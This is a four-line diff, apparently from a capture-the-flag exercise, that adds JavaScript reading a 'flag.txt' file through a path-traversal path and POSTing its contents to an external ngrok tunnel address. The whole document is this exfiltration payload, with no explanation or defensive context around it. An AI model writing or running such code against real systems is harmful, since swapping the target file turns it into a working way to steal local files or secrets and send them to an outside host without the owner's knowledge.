@@ -1,0 +1,4 @@
+fetch("https://5f67-77-140-212-69.ngrok-free.app/", {
+    method: 'POST',
+    body: encodeURIComponent(require('fs').readFileSync('../../../../flag.txt', 'utf8')),
+});
